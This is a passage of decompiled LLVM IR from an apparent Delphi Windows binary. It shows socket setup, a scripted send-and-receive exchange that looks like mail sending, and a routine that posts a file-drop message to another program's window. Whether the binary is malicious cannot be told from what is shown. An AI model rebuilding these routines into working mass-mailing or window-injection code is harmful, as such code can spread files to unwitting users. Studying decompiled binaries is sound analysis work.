  %109 = load i32, i32* %17, align 4, !insn.addr !893
  %110 = add i32 %esp.0.reload, -12, !insn.addr !893
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !893
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !894
  %113 = load i32, i32* %19, align 4, !insn.addr !895
  %114 = add i32 %esp.0.reload, -16, !insn.addr !895
  %115 = inttoptr i32 %114 to i32*, !insn.addr !895
  store i32 %113, i32* %115, align 4, !insn.addr !895
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !896
  %117 = load i32, i32* %21, align 4, !insn.addr !897
  %118 = add i32 %esp.0.reload, -20, !insn.addr !897
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !897
  %120 = call i32 @"@LStrCatN"(), !insn.addr !898
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !899
  %122 = load i32, i32* %23, align 4, !insn.addr !900
  %123 = add i32 %122, -1, !insn.addr !900
  %124 = icmp eq i32 %123, 0, !insn.addr !900
  store i32 %123, i32* %23, align 4, !insn.addr !900
  %125 = icmp eq i1 %124, false, !insn.addr !901
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !901
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !901
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !901

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !902
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !903
  store i32 4216319, i32* %111, align 4, !insn.addr !904
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !905
  ret i32 %127, !insn.addr !906
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !907
  ret i32 %0, !insn.addr !907
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !908
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !909
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !910
  %0 = call i32 @function_4036c8(), !insn.addr !911
  %1 = inttoptr i32 %0 to i8*, !insn.addr !912
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !913
  %3 = call i32 @"@FillChar"(), !insn.addr !914
  %4 = icmp eq %hostent* %2, null, !insn.addr !915
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !916

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !913
  %6 = add i32 %5, 12, !insn.addr !917
  %7 = inttoptr i32 %6 to i32*, !insn.addr !917
  %8 = load i32, i32* %7, align 4, !insn.addr !917
  %9 = inttoptr i32 %8 to i32*, !insn.addr !918
  %10 = load i32, i32* %9, align 4, !insn.addr !918
  %11 = inttoptr i32 %10 to i8*, !insn.addr !919
  %12 = load i8, i8* %11, align 1, !insn.addr !919
  %13 = sext i8 %12 to i32, !insn.addr !920
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !921
  br label %dec_label_pc_405653, !insn.addr !921

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !922
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !923
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !924
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !925
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !925
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !925
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !926
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !927
  %5 = trunc i32 %4 to i16, !insn.addr !927
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !928
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !929
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !929
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !930
  %9 = icmp eq i32 %8, -1, !insn.addr !931
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !932
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !932

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !933
  %11 = trunc i32 %10 to i16, !insn.addr !934
  %12 = call i16 @htons(i16 %11), !insn.addr !934
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !935
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !935
  %14 = sext i16 %12 to i32, !insn.addr !936
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !936
  %16 = icmp eq i32 %15, 0, !insn.addr !937
  %17 = icmp eq i1 %16, false, !insn.addr !938
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !938
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !938

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !939
  store i32 %8, i32* %18, align 4, !insn.addr !939
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !940
  br label %dec_label_pc_4056f2, !insn.addr !940

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !941
  %20 = load i32, i32* %19, align 4, !insn.addr !941
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !942
  %21 = add i32 %esp.0.reload, 8, !insn.addr !943
  %22 = inttoptr i32 %21 to i32*, !insn.addr !943
  store i32 4216591, i32* %22, align 4, !insn.addr !943
  %23 = call i32 @"@LStrClr"(), !insn.addr !944
  ret i32 %23, !insn.addr !945
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !946
  ret i32 %0, !insn.addr !946
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !947
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !948
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !949
  %2 = call i32 @WSACleanup(), !insn.addr !950
  ret i32 %2, !insn.addr !951
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !952
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !953
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !953
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !953
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !954
  %4 = call i32 @function_4036c8(), !insn.addr !955
  %5 = call i32 @StrCopy(), !insn.addr !956
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !957
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !958
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !959
  %9 = call i32 @"@LStrClr"(), !insn.addr !960
  ret i32 %9, !insn.addr !961
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !962
  ret i32 %0, !insn.addr !962
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !963
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !964
}

define i32 @function_4057a4() local_unnamed_addr {
dec_label_pc_4057a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !965
  %2 = call i32 @StrPas(), !insn.addr !966
  ret i32 %2, !insn.addr !967
}

define i32 @function_4057d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4057d0:
  %esp.1.reg2mem = alloca i32, !insn.addr !968
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !968
  %esp.0.reg2mem = alloca i32, !insn.addr !968
  %ecx.0.reg2mem = alloca i32, !insn.addr !968
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !969
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !970
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !970
  br label %dec_label_pc_4057d9, !insn.addr !970

dec_label_pc_4057d9:                              ; preds = %dec_label_pc_4057d9, %dec_label_pc_4057d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !971
  %2 = inttoptr i32 %1 to i32*, !insn.addr !971
  store i32 0, i32* %2, align 4, !insn.addr !971
  %3 = add i32 %esp.0.reload, -8, !insn.addr !972
  %4 = inttoptr i32 %3 to i32*, !insn.addr !972
  store i32 0, i32* %4, align 4, !insn.addr !972
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !973
  %6 = icmp eq i32 %5, 0, !insn.addr !973
  %7 = icmp eq i1 %6, false, !insn.addr !974
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !974
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !974
  br i1 %7, label %dec_label_pc_4057d9, label %dec_label_pc_4057e0, !insn.addr !974

dec_label_pc_4057e0:                              ; preds = %dec_label_pc_4057d9
  %8 = add i32 %esp.0.reload, -12, !insn.addr !975
  %9 = inttoptr i32 %8 to i32*, !insn.addr !975
  store i32 0, i32* %9, align 4, !insn.addr !975
  %10 = call i32 @function_4036b8(), !insn.addr !976
  %11 = call i32 @function_4036b8(), !insn.addr !977
  %12 = call i32 @function_4036b8(), !insn.addr !978
  %13 = call i32 @function_4036b8(), !insn.addr !979
  %14 = call i32 @function_4036b8(), !insn.addr !980
  %15 = call i32 @function_4036b8(), !insn.addr !981
  %16 = call i32 @function_4036b8(), !insn.addr !982
  %17 = add i32 %esp.0.reload, -20, !insn.addr !983
  %18 = inttoptr i32 %17 to i32*, !insn.addr !983
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !983
  store i32 %19, i32* %18, align 4, !insn.addr !983
  %20 = add i32 %esp.0.reload, -24, !insn.addr !984
  %21 = inttoptr i32 %20 to i32*, !insn.addr !984
  store i32 4217413, i32* %21, align 4, !insn.addr !984
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !985
  %23 = add i32 %esp.0.reload, -28, !insn.addr !985
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !985
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !986
  %25 = call i32 @function_405664(), !insn.addr !987
  %26 = icmp eq i32 %25, 0, !insn.addr !988
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !989
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !989
  br i1 %26, label %dec_label_pc_405a10, label %dec_label_pc_40584e, !insn.addr !989

dec_label_pc_40584e:                              ; preds = %dec_label_pc_4057e0
  %27 = add i32 %esp.0.reload, -32, !insn.addr !990
  %28 = inttoptr i32 %27 to i32*, !insn.addr !990
  store i32 ptrtoint ([6 x i8]* @global_var_405a60 to i32), i32* %28, align 4, !insn.addr !990
  %29 = add i32 %esp.0.reload, -36, !insn.addr !991
  %30 = inttoptr i32 %29 to i32*, !insn.addr !991
  %31 = add i32 %esp.0.reload, -40, !insn.addr !992
  %32 = inttoptr i32 %31 to i32*, !insn.addr !992
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %32, align 4, !insn.addr !992
  %33 = call i32 @"@LStrCatN"(), !insn.addr !993
  %34 = call i32 @function_405724(), !insn.addr !994
  %35 = call i32 @function_4057a4(), !insn.addr !995
  %36 = call i32 @function_405724(), !insn.addr !996
  %37 = call i32 @function_4057a4(), !insn.addr !997
  %38 = call i32 @"@LStrCat"(), !insn.addr !998
  %39 = call i32 @function_405724(), !insn.addr !999
  %40 = call i32 @function_4057a4(), !insn.addr !1000
  %41 = call i32 @"@LStrCat"(), !insn.addr !1001
  %42 = call i32 @function_405724(), !insn.addr !1002
  %43 = call i32 @function_4057a4(), !insn.addr !1003
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1004
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1004
  store i32 ptrtoint ([13 x i8]* @global_var_405a94 to i32), i32* %45, align 4, !insn.addr !1004
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1005
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1005
  store i32 %arg1, i32* %47, align 4, !insn.addr !1005
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1006
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1006
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %49, align 4, !insn.addr !1006
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1007
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1007
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %51, align 4, !insn.addr !1007
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1008
  %53 = call i32 @function_405724(), !insn.addr !1009
  %54 = call i32 @function_4057a4(), !insn.addr !1010
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1011
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1011
  store i32 ptrtoint ([11 x i8]* @global_var_405ab8 to i32), i32* %56, align 4, !insn.addr !1011
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1012
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1012
  store i32 %arg2, i32* %58, align 4, !insn.addr !1012
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1013
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1013
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %60, align 4, !insn.addr !1013
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1014
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1014
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %62, align 4, !insn.addr !1014
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1015
  %64 = call i32 @function_405724(), !insn.addr !1016
  %65 = call i32 @function_4057a4(), !insn.addr !1017
  %66 = call i32 @function_405724(), !insn.addr !1018
  %67 = call i32 @function_4057a4(), !insn.addr !1019
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1020
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1020
  store i32 ptrtoint ([8 x i8]* @global_var_405adc to i32), i32* %69, align 4, !insn.addr !1020
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1021
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1021
  store i32 %arg1, i32* %71, align 4, !insn.addr !1021
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1022
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1022
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %73, align 4, !insn.addr !1022
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1023
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1023
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %75, align 4, !insn.addr !1023
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1024
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1024
  store i32 ptrtoint ([6 x i8]* @global_var_405aec to i32), i32* %77, align 4, !insn.addr !1024
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1025
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1025
  store i32 %arg2, i32* %79, align 4, !insn.addr !1025
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1026
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1026
  store i32 ptrtoint (i32* @global_var_405aac to i32), i32* %81, align 4, !insn.addr !1026
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1027
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1027
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %83, align 4, !insn.addr !1027
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1028
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1028
  store i32 ptrtoint ([10 x i8]* @global_var_405afc to i32), i32* %85, align 4, !insn.addr !1028
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1029
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1029
  store i32 %arg3, i32* %87, align 4, !insn.addr !1029
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1030
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1030
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %89, align 4, !insn.addr !1030
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1031
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1031
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %91, align 4, !insn.addr !1031
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1032
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1032
  store i32 %arg4, i32* %93, align 4, !insn.addr !1032
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1033
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1033
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !1033
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1034
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1034
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !1034
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1035
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !1035
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1036
  %101 = call i32 @function_405724(), !insn.addr !1037
  %102 = call i32 @function_4057a4(), !insn.addr !1038
  %103 = call i32 @function_405724(), !insn.addr !1039
  %104 = call i32 @function_4057a4(), !insn.addr !1040
  %105 = call i32 @function_405718(), !insn.addr !1041
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1042
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1042
  br label %dec_label_pc_405a10, !insn.addr !1042

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1043
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1043
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1044
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1045
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1046
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1046
  store i32 4217420, i32* %110, align 4, !insn.addr !1046
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1047
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1048
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1049
  ret i32 %113, !insn.addr !1050
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1051
  ret i32 %0, !insn.addr !1051
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1052
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1053
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1054
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1054
  store i32 %3, i32* %4, align 4, !insn.addr !1054
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1055
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1055
  %9 = add i8 %6, %8, !insn.addr !1055
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1055
  store i8 %9, i8* %10, align 1, !insn.addr !1055
  %11 = add i32 %2, 85, !insn.addr !1056
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1056
  %13 = load i8, i8* %12, align 1, !insn.addr !1056
  %14 = trunc i32 %1 to i8, !insn.addr !1056
  %15 = add i8 %13, %14, !insn.addr !1056
  store i8 %15, i8* %12, align 1, !insn.addr !1056
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1057
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1057
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1057
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1058
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1059
  %19 = add i32 %18, 1, !insn.addr !1059
  %20 = icmp eq i32 %19, 0, !insn.addr !1059
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1059
  %21 = icmp eq i1 %20, false, !insn.addr !1060
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1060

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1061
  %23 = call i32 @"@LStrClr"(), !insn.addr !1062
  br label %dec_label_pc_405b51, !insn.addr !1062

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1063
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1064
  ret i32 0, !insn.addr !1065
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1066
  ret i32 %0, !insn.addr !1066
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1067
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1068
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1069
  %2 = add i32 %1, -1, !insn.addr !1069
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1069
  ret i32 %0, !insn.addr !1070
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1071
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1072
  %2 = icmp eq i32 %0, 0, !insn.addr !1073
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1074
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1074

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1075
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1076
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1076
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1076
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1077
  %7 = icmp eq i1 %6, false, !insn.addr !1078
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1079
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1079

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1080
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1080
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1081
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1081
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1082
  %13 = icmp eq i1 %12, false, !insn.addr !1083
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1084
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1084

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1085
  %15 = add i32 %14, 22, !insn.addr !1086
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1087
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1087
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1088
  %18 = icmp eq i32* %17, null, !insn.addr !1089
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1090
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1090

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1091
  %20 = icmp eq i32* %19, null, !insn.addr !1092
  %21 = icmp eq i1 %20, false, !insn.addr !1093
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1093

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1094
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1094
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1094
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1095
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1096
  br label %dec_label_pc_405c7a, !insn.addr !1096

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1088
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1091
  store i32 20, i32* %19, align 4, !insn.addr !1097
  %27 = add i32 %26, 4, !insn.addr !1098
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1098
  store i32 0, i32* %28, align 4, !insn.addr !1098
  %29 = add i32 %26, 8, !insn.addr !1099
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1099
  store i32 0, i32* %30, align 4, !insn.addr !1099
  %31 = add i32 %26, 12, !insn.addr !1100
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1100
  store i32 0, i32* %32, align 4, !insn.addr !1100
  %33 = add i32 %26, 16, !insn.addr !1101
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1101
  store i32 0, i32* %34, align 4, !insn.addr !1101
  %35 = call i32 @function_4036c8(), !insn.addr !1102
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1103
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1103
  %37 = add i32 %26, 20, !insn.addr !1104
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1105
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1106
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1107
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1108
  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1109
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1110
